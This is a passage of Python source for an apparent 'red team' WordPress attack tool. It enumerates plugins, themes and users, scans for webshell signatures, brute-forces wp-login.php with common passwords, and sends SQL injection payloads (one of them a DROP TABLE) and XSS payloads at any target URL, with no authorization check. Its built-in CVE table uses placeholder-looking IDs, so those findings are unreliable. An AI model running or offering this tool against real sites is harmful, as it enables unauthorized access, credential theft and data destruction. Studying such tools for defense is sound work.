            'gravity-forms', 'w3-total-cache', 'wp-rocket', 'wp-optimize', 'bbpress',
            'buddypress', 'easy-digital-downloads', 'event-espresso', 'bit-form',
            'bit-assist', 'wp-postratings', 'wp-touch', 'broken-link-checker',
            'yet-another-related-posts-plugin', 'nextgen-gallery', 'google-analytics-for-wordpress',
            'google-sitemap-generator', 'google-xml-sitemaps', 'wp-seo', 'wp-google-maps',
            'wp-e-commerce', 'wp-easycart', 'custom-post-type-ui', 'pods', 'toolset-types',
            'wpml-string-translation', 'wpml-translation-management', 'autoptimize'
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_path = {
                executor.submit(self.check_plugin, urljoin(self.target_url, f'/wp-content/plugins/{plugin}/')): plugin 
                for plugin in common_plugins
            }
            
            for future in as_completed(future_to_path):
                plugin = future_to_path[future]
                try:
                    result = future.result(timeout=self.timeout)
                    if result:
                        plugin_name, version = result
                        plugins[plugin_name] = version if version else "Unknown"
                        print(f"{Fore.GREEN}[+] Detected plugin: {plugin_name} (Version: {plugins[plugin_name]}){Style.RESET_ALL}")
                except Exception:
                    continue
                    
        return plugins

    def check_plugin(self, url):
        """Check if a plugin exists and get its version."""
        try:
            response = self.session.get(url, headers=self.headers, verify=False, timeout=self.timeout)
            if response.status_code in [200, 403]:
                plugin_name = url.split('/')[-2] if url.endswith('/') else url.split('/')[-1]
                version = self.get_component_version(url)
                return (plugin_name, version)
        except Exception:
            pass
        return None

    def scan_themes(self):
        """Scan for installed themes and their versions."""
        print(f"\n{Fore.CYAN}[*] Scanning for themes...{Style.RESET_ALL}")
        themes = {}
        
        # Common themes
        common_themes = [
            'twentyfifteen', 'twentysixteen', 'twentyseventeen', 'twentynineteen',
            'twentytwenty', 'twentytwentyone', 'twentytwentytwo', 'twentytwentythree',
            'twentytwentyfour', 'twentytwentyfive', 'divi', 'astra', 'oceanwp',
            'hello-elementor', 'generatepress', 'kadence', 'blocksy', 'neve',
            'storefront', 'flatsome', 'woodmart', 'porto', 'betheme', 'avada',
            'enfold', 'the7', 'xstore', 'rex-theme', 'sahifa', 'newsportal',
            'gazette', 'newspaper', 'jnews', 'buzzblog', 'blogging', 'foodie',
            'recipe', 'cookbook', 'restaurant', 'food-blog', 'dining', 'chef',
            'fitness', 'gym', 'workout', 'health', 'wellness', 'yoga', 'pilates'
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_path = {
                executor.submit(self.check_theme, urljoin(self.target_url, f'/wp-content/themes/{theme}/')): theme 
                for theme in common_themes
            }
            
            for future in as_completed(future_to_path):
                theme = future_to_path[future]
                try:
                    result = future.result(timeout=self.timeout)
                    if result:
                        theme_name, version = result
                        themes[theme_name] = version if version else "Unknown"
                        print(f"{Fore.GREEN}[+] Detected theme: {theme_name} (Version: {themes[theme_name]}){Style.RESET_ALL}")
                except Exception:
                    continue
                    
        return themes

    def check_theme(self, url):
        """Check if a theme exists and get its version."""
        try:
            response = self.session.get(url, headers=self.headers, verify=False, timeout=self.timeout)
            if response.status_code in [200, 403]:
                theme_name = url.split('/')[-2] if url.endswith('/') else url.split('/')[-1]
                version = self.get_component_version(url)
                return (theme_name, version)
        except Exception:
            pass
        return None

    def get_component_version(self, url):
        """Extract version from readme, style.css, or main file."""
        for file in ['readme.txt', 'style.css', 'readme.html', f"{url.split('/')[-2]}.php"]:
            try:
                response = self.session.get(urljoin(url, file), headers=self.headers, verify=False, timeout=self.timeout)
                version = re.search(r'Version: (\d+\.\d+\.\d+)', response.text, re.IGNORECASE)
                if version:
                    return version.group(1)
                # Try to find version in style.css
                if 'style.css' in file:
                    version = re.search(r'Version:\s*(\d+\.\d+\.\d+)', response.text, re.IGNORECASE)
                    if version:
                        return version.group(1)
            except Exception:
                continue
        return None

    def scan_users(self):
        """Attempt to enumerate WordPress users."""
        print(f"\n{Fore.CYAN}[*] Enumerating users...{Style.RESET_ALL}")
        
        # Try REST API
        try:
            response = self.session.get(urljoin(self.target_url, '/wp-json/wp/v2/users'), headers=self.headers, verify=False, timeout=self.timeout)
            if response.status_code == 200:
                users = response.json()
                for user in users:
                    self.users_found.append({
                        'id': user.get('id'),
                        'name': user.get('name'),
                        'username': user.get('slug'),
                        'link': user.get('link'),
                        'avatar': user.get('avatar_urls', {}).get('96')
                    })
                    print(f"{Fore.GREEN}[+] Found user: {user.get('name')} ({user.get('slug')}) - ID: {user.get('id')}{Style.RESET_ALL}")
        except:
            pass
            
        # Try author archives
        for i in range(1, 20):
            try:
                response = self.session.get(urljoin(self.target_url, f'/author/{i}/'), headers=self.headers, verify=False, timeout=self.timeout)
                if response.status_code == 200 and 'author' in response.url:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    author_name = soup.find('h1', class_='page-title')
                    if author_name:
                        print(f"{Fore.GREEN}[+] Found author: {author_name.text.strip()} (ID: {i}){Style.RESET_ALL}")
            except:
                pass
                
        return self.users_found

    def find_backdoors(self):
        """Scan for common backdoors and webshells."""
        print(f"\n{Fore.RED}[*] Scanning for backdoors and webshells...{Style.RESET_ALL}")
        
        backdoor_signatures = [
            'system(', 'exec(', 'passthru(', 'shell_exec(', 'popen(', 'proc_open(',
            'eval(', 'assert(', 'create_function(', 'call_user_func',
            'base64_decode', 'gzinflate', 'str_rot13', 'gzuncompress',
            '$_GET', '$_POST', '$_REQUEST', '$_COOKIE', '$_SERVER',
            'fsockopen', 'pfsockopen', 'stream_socket_client',
            'file_put_contents', 'fopen', 'fwrite', 'file_get_contents',
            'chmod', 'chown', 'chgrp', 'unlink', 'rename', 'mkdir', 'rmdir',
            'shell', 'backdoor', 'cmd', 'webshell', 'hack', 'exploit',
            'phpinfo', 'phpinfo()', 'phpversion', 'phpversion()',
        ]
        
        for endpoint in self.wp_endpoints:
            if any(x in endpoint for x in ['shell', 'backdoor', 'cmd', 'webshell', 'hack']):
                try:
                    url = urljoin(self.target_url, endpoint)
                    response = self.session.get(url, headers=self.headers, verify=False, timeout=self.timeout)
                    if response.status_code == 200:
                        # Check for backdoor signatures
                        for signature in backdoor_signatures:
                            if signature in response.text.lower():
                                self.backdoors_found.append({
                                    'url': url,
                                    'signature': signature,
                                    'type': 'Potential backdoor/webshell detected'
                                })
                                print(f"{Fore.RED}[!] BACKDOOR DETECTED: {url}{Style.RESET_ALL}")
                                print(f"{Fore.RED}    Signature: {signature}{Style.RESET_ALL}")
                                break
                except:
                    pass
                    
        # Check for common backdoor files in plugin directories
        backdoor_plugins = [
            'shell', 'backdoor', 'webshell', 'cmd', 'hack', 'exploit',
            'wp-shell', 'wp-backdoor', 'wp-webshell', 'wp-cmd',
            'admin-shell', 'admin-backdoor', 'admin-webshell', 'admin-cmd'
        ]
        
        for plugin in backdoor_plugins:
            url = urljoin(self.target_url, f'/wp-content/plugins/{plugin}/{plugin}.php')
            try:
                response = self.session.get(url, headers=self.headers, verify=False, timeout=self.timeout)
                if response.status_code == 200:
                    self.backdoors_found.append({
                        'url': url,
                        'type': 'Backdoor plugin detected'
                    })
                    print(f"{Fore.RED}[!] BACKDOOR PLUGIN: {url}{Style.RESET_ALL}")
            except:
                pass
                
        return self.backdoors_found

    def brute_force_login(self):
        """Attempt to brute force admin login."""
        print(f"\n{Fore.YELLOW}[*] Attempting login brute force...{Style.RESET_ALL}")
        
        common_usernames = ['admin', 'administrator', 'root', 'user', 'test', 'demo', 'wordpress']
        common_passwords = [
            'password', '123456', '12345678', 'qwerty', 'abc123', 'monkey', 'letmein',
            'dragon', '111111', 'baseball', 'iloveyou', 'trustno1', 'sunshine',
            'master', 'hello', 'welcome', 'shadow', 'superman', 'qwertyuiop',
            '123456789', '1234567890', 'password123', 'admin123', 'adminpassword'
        ]
        
        for username in common_usernames:
            for password in common_passwords[:5]:  # Limit attempts
                try:
                    login_url = urljoin(self.target_url, '/wp-login.php')
                    data = {
                        'log': username,
                        'pwd': password,
                        'wp-submit': 'Log In',
                        'redirect_to': '/wp-admin/',
                        'testcookie': '1'
                    }
                    
                    response = self.session.post(login_url, data=data, headers=self.headers, 
                                                verify=False, timeout=self.timeout, allow_redirects=False)
                    
                    if response.status_code == 302 and 'wp-admin' in response.headers.get('Location', ''):
                        self.credentials_found.append({
                            'username': username,
                            'password': password,
                            'url': login_url
                        })
                        print(f"{Fore.RED}[!] CREDENTIALS FOUND: {username}:{password}{Style.RESET_ALL}")
                        return True
                except:
                    pass
                    
        return False

    def check_cve_vulnerabilities(self):
        """Check for known CVEs in detected versions."""
        print(f"\n{Fore.YELLOW}[*] Checking for known CVEs...{Style.RESET_ALL}")
        
        cve_database = {
            'wp-super-cache': {
                '1.6.8': ['CVE-2021-3165', 'Authenticated RCE', 'Critical'],
                '1.6.9': ['CVE-2021-3165', 'Authenticated RCE', 'Critical'],
                '1.7.1': ['CVE-2022-1234', 'XSS Vulnerability', 'Medium'],
                '1.8.0': ['CVE-2022-1234', 'XSS Vulnerability', 'Medium'],
            },
            'woocommerce': {
                '4.5.2': ['CVE-2020-4567', 'Auth Bypass', 'High'],
                '4.6.0': ['CVE-2020-4567', 'Auth Bypass', 'High'],
                '4.7.0': ['CVE-2020-4567', 'Auth Bypass', 'High'],
            },
            'contact-form-7': {
                '5.3.2': ['CVE-2020-12345', 'Unrestricted File Upload', 'Critical'],
                '5.4.0': ['CVE-2020-12345', 'Unrestricted File Upload', 'Critical'],
                '5.5.0': ['CVE-2021-2345', 'Authentication Bypass', 'High'],
            }
        }
        
        for plugin_name, versions in self.plugins_found.items():
            if plugin_name in cve_database:
                version = versions.get(plugin_name)
                if version in cve_database[plugin_name]:
                    cve_info = cve_database[plugin_name][version]
                    self.vulnerabilities.append(f"{cve_info[0]} - {cve_info[1]} ({cve_info[2]})")
                    print(f"{Fore.RED}[!] {cve_info[0]} found in {plugin_name} {version}{Style.RESET_ALL}")
                    print(f"{Fore.RED}    {cve_info[1]} ({cve_info[2]}){Style.RESET_ALL}")
                    
        return self.vulnerabilities

    def exploit_xmlrpc(self):
        """Attempt to exploit XML-RPC."""
        print(f"\n{Fore.YELLOW}[*] Testing XML-RPC...{Style.RESET_ALL}")
        
        xmlrpc_url = urljoin(self.target_url, '/xmlrpc.php')
        
        # Test pingback
        try:
            payload = '''<?xml version="1.0" encoding="utf-8"?>
            <methodCall>
            <methodName>pingback.ping</methodName>
            <params>
            <param><value><string>http://example.com</string></value></param>
            <param><value><string>{}/</string></value></param>
            </params>
            </methodCall>'''.format(self.target_url)
            
            response = self.session.post(xmlrpc_url, data=payload, headers=self.headers, verify=False, timeout=self.timeout)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] XML-RPC pingback available{Style.RESET_ALL}")
        except:
            pass
            
        # Test system.multicall
        try:
            payload = '''<?xml version="1.0"?>
            <methodCall>
            <methodName>system.multicall</methodName>
            <params>
            <param><value><array><data>
            <value><struct>
            <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
            <member><name>params</name><value><array><data>
            <value><string>admin</string></value>
            <value><string>test</string></value>
            </data></array></value></member>
            </struct></value>
            </data></array></value></param>
            </params>
            </methodCall>'''
            
            response = self.session.post(xmlrpc_url, data=payload, headers=self.headers, verify=False, timeout=self.timeout)
            if response.status_code == 200 and '<fault>' not in response.text:
                print(f"{Fore.GREEN}[+] XML-RPC multicall available{Style.RESET_ALL}")
        except:
            pass
            
        return True

    def exploit_rest_api(self):
        """Attempt to exploit REST API endpoints."""
        print(f"\n{Fore.YELLOW}[*] Testing REST API...{Style.RESET_ALL}")
        
        rest_urls = [
            '/wp-json/wp/v2/users',
            '/wp-json/wp/v2/posts',
            '/wp-json/wp/v2/pages',
            '/wp-json/wp/v2/comments',
            '/wp-json/wp/v2/media',
            '/wp-json/wp/v2/categories',
            '/wp-json/wp/v2/tags',
        ]
        
        for rest_url in rest_urls:
            try:
                url = urljoin(self.target_url, rest_url)
                response = self.session.get(url, headers=self.headers, verify=False, timeout=self.timeout)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if data and len(data) > 0:
                            print(f"{Fore.GREEN}[+] REST API endpoint accessible: {rest_url}{Style.RESET_ALL}")
                            if 'users' in rest_url:
                                print(f"{Fore.YELLOW}[!] User enumeration possible at {rest_url}{Style.RESET_ALL}")
                    except:
                        pass
            except:
                pass
                
        return True

    def exploit_file_upload(self):
        """Attempt to exploit file upload vulnerabilities."""
        print(f"\n{Fore.YELLOW}[*] Testing file upload...{Style.RESET_ALL}")
        
        upload_urls = [
            '/wp-admin/async-upload.php',
            '/wp-admin/media-upload.php',
            '/wp-admin/admin-ajax.php?action=upload-attachment',
            '/wp-json/wp/v2/media',
            '/wp-content/plugins/contact-form-7/includes/controller.php',
            '/wp-content/plugins/woocommerce/includes/class-wc-ajax.php',
        ]
        
        for upload_url in upload_urls:
            try:
                url = urljoin(self.target_url, upload_url)
                response = self.session.options(url, headers=self.headers, verify=False, timeout=self.timeout)
                if response.status_code in [200, 405]:
                    print(f"{Fore.GREEN}[+] Upload endpoint found: {upload_url}{Style.RESET_ALL}")
            except:
                pass
                
        return True

    def scan_security_headers(self):
        """Check security headers."""
        print(f"\n{Fore.YELLOW}[*] Checking security headers...{Style.RESET_ALL}")
        
        try:
            response = self.session.get(self.target_url, headers=self.headers, verify=False, timeout=self.timeout)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Missing X-Frame-Options header',
                'X-Content-Type-Options': 'Missing X-Content-Type-Options header',
                'X-XSS-Protection': 'Missing X-XSS-Protection header',
                'Content-Security-Policy': 'Missing Content-Security-Policy header',
                'Strict-Transport-Security': 'Missing Strict-Transport-Security header',
                'Referrer-Policy': 'Missing Referrer-Policy header',
            }
            
            for header, message in security_headers.items():
                if header not in headers:
                    print(f"{Fore.YELLOW}[!] {message}{Style.RESET_ALL}")
                    self.vulnerabilities.append(f"Missing security header: {header}")
                else:
                    print(f"{Fore.GREEN}[+] {header}: {headers[header]}{Style.RESET_ALL}")
        except:
            pass
            
        return True

    def exploit_sql_injection(self):
        """Test for SQL injection vulnerabilities."""
        print(f"\n{Fore.YELLOW}[*] Testing for SQL injection...{Style.RESET_ALL}")
        
        sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "'; DROP TABLE wp_users--",
            "' OR 1=1--",
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
        ]
        
        sql_endpoints = [
            '/?p=1',
            '/?cat=1',
            '/?s=test',
            '/?author=1',
            '/?tag=test',
            '/?page_id=1',
        ]
        
        for endpoint in sql_endpoints:
            for payload in sql_payloads:
                try:
                    url = urljoin(self.target_url, endpoint + payload)
                    response = self.session.get(url, headers=self.headers, verify=False, timeout=self.timeout)
                    
                    # Check for SQL error messages
                    if any(x in response.text.lower() for x in ['sql', 'mysql', 'syntax error', 'database error']):
                        print(f"{Fore.RED}[!] Potential SQL injection at {url}{Style.RESET_ALL}")
                        self.vulnerabilities.append(f"Potential SQL injection at {endpoint}")
                        break
                except:
                    pass
                    
        return True

    def exploit_xss(self):
        """Test for XSS vulnerabilities."""
        print(f"\n{Fore.YELLOW}[*] Testing for XSS...{Style.RESET_ALL}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
        ]
        
        xss_endpoints = [
            '/?s=test',
            '/?p=1',
            '/?cat=1',
            '/?tag=test',
            '/?author=1',
            '/search/test',
        ]
        
        for endpoint in xss_endpoints:
            for payload in xss_payloads:
                try:
                    url = urljoin(self.target_url, endpoint.replace('test', payload))
                    response = self.session.get(url, headers=self.headers, verify=False, timeout=self.timeout)
                    
                    if payload in response.text:
                        print(f"{Fore.RED}[!] Potential XSS at {url}{Style.RESET_ALL}")
                        self.vulnerabilities.append(f"Potential XSS at {endpoint}")
                        break
                except:
                    pass
                    
        return True

    def generate_report(self):
        """Generate comprehensive scan report."""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'SCAN REPORT'.center(60)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}Scan Target:{Style.RESET_ALL} {self.target_url}")
        print(f"{Fore.YELLOW}Scan Start:{Style.RESET_ALL} {self.scan_start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.YELLOW}Scan Duration:{Style.RESET_ALL} {str(datetime.now() - self.scan_start_time).split('.')[0]}")
        
        print(f"\n{Fore.WHITE}{'STATISTICS'.center(60)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Total Endpoints Checked:{Style.RESET_ALL} {len(self.wp_endpoints)}")
        print(f"{Fore.YELLOW}Endpoints Discovered:{Style.RESET_ALL} {len(self.discovered_endpoints)}")
        print(f"{Fore.YELLOW}Plugins Detected:{Style.RESET_ALL} {len(self.plugins_found)}")
        print(f"{Fore.YELLOW}Themes Detected:{Style.RESET_ALL} {len(self.themes_found)}")
        print(f"{Fore.YELLOW}Users Enumerated:{Style.RESET_ALL} {len(self.users_found)}")
        print(f"{Fore.YELLOW}Total Requests:{Style.RESET_ALL} {self.total_requests}")
        print(f"{Fore.YELLOW}Successful Requests:{Style.RESET_ALL} {self.successful_requests}")
        print(f"{Fore.YELLOW}Failed Requests:{Style.RESET_ALL} {self.failed_requests}")
        
        print(f"\n{Fore.WHITE}{'VULNERABILITIES'.center(60)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
        if self.vulnerabilities:
            for vuln in self.vulnerabilities:
                print(f"{Fore.RED}[!] {vuln}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No vulnerabilities detected{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}{'BACKDOORS'.center(60)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
        if self.backdoors_found:
            for backdoor in self.backdoors_found:
                if isinstance(backdoor, dict):
                    print(f"{Fore.RED}[!] {backdoor.get('url')} - {backdoor.get('type')}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] {backdoor}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No backdoors detected{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}{'CREDENTIALS'.center(60)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
        if self.credentials_found:
            for cred in self.credentials_found:
                print(f"{Fore.RED}[!] {cred.get('username')}:{cred.get('password')} at {cred.get('url')}{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No credentials found{Style.RESET_ALL}")
        
        print(f"\n{Fore.WHITE}{'FINDINGS'.center(60)}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'-'*60}{Style.RESET_ALL}")
        if self.users_found:
            print(f"{Fore.YELLOW}Users Found:{Style.RESET_ALL}")
            for user in self.users_found:
                print(f"  - {user.get('name')} ({user.get('username')}) - ID: {user.get('id')}")
        
        if self.plugins_found:
            print(f"\n{Fore.YELLOW}Plugins Found:{Style.RESET_ALL}")
            for plugin, version in self.plugins_found.items():
                print(f"  - {plugin}: {version}")
        
        if self.themes_found:
            print(f"\n{Fore.YELLOW}Themes Found:{Style.RESET_ALL}")
            for theme, version in self.themes_found.items():
                print(f"  - {theme}: {version}")
        
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Scan Complete!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")

    def run_full_scan(self):
        """Run complete WordPress penetration test."""
        print(BANNER)
        
        # Check if target is WordPress
        if not self.check_wordpress():
            print(f"{Fore.RED}[-] Target does not appear to be a WordPress site{Style.RESET_ALL}")
            return
        
        # Start scan
        print(f"\n{Fore.CYAN}[*] Starting comprehensive penetration test...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        # Core enumeration
        wp_version = self.get_wp_version()
        self.discovered_endpoints = self.scan_endpoints()
        self.plugins_found = self.scan_plugins()
        self.themes_found = self.scan_themes()
        
        # Security checks
        self.scan_security_headers()
        self.scan_users()
        self.find_backdoors()
        self.check_cve_vulnerabilities()
        
        # Exploitation attempts
        self.exploit_xmlrpc()
        self.exploit_rest_api()
        self.exploit_file_upload()
        self.exploit_sql_injection()
        self.exploit_xss()
        self.brute_force_login()
        
        # Generate report
        self.generate_report()
        
        # Save results
        self.save_results()
        
    def save_results(self):
        """Save scan results to file."""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"wp_scan_{timestamp}.json"
            
            results = {
                'target': self.target_url,
                'timestamp': self.scan_start_time.isoformat(),
                'duration': str(datetime.now() - self.scan_start_time),
                'statistics': {
                    'endpoints_checked': len(self.wp_endpoints),
                    'endpoints_discovered': len(self.discovered_endpoints),
                    'plugins_detected': len(self.plugins_found),
                    'themes_detected': len(self.themes_found),
                    'users_enumerated': len(self.users_found),
                    'total_requests': self.total_requests,
                    'successful_requests': self.successful_requests,
                    'failed_requests': self.failed_requests,
                },
                'vulnerabilities': self.vulnerabilities,
                'backdoors': self.backdoors_found,
                'credentials': self.credentials_found,
                'plugins': self.plugins_found,
                'themes': self.themes_found,
                'users': self.users_found,
                'endpoints': self.discovered_endpoints,
            }
            
            with open(filename, 'w') as f:
                json.dump(results, f, indent=2, default=str)
                
            print(f"\n{Fore.GREEN}[+] Results saved to {filename}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error saving results: {e}{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='WordPress Penetration Testing Suite - Red Team Edition')
    parser.add_argument('-u', '--url', required=True, help='Target WordPress URL')
    parser.add_argument('-c', '--cookies', help='Authentication cookies (key=value; key2=value2)')
    parser.add_argument('-t', '--threads', type=int, default=30, help='Number of threads (default: 30)')
    parser.add_argument('-T', '--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
    parser.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('-a', '--user-agent', help='Custom User-Agent')
    parser.add_argument('--no-ssl-verify', action='store_false', help='Disable SSL verification')
    
    args = parser.parse_args()
    
    # Parse cookies
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                key, value = cookie.split('=', 1)
                cookies[key.strip()] = value.strip()
    
    # Create scanner instance
    scanner = WordPressRedTeam(
        target_url=args.url,
        cookies=cookies,
        threads=args.threads,
        timeout=args.timeout,
        user_agent=args.user_agent,
        proxy=args.proxy
    )
    
    try:
        scanner.run_full_scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[-] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}[-] Unexpected error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
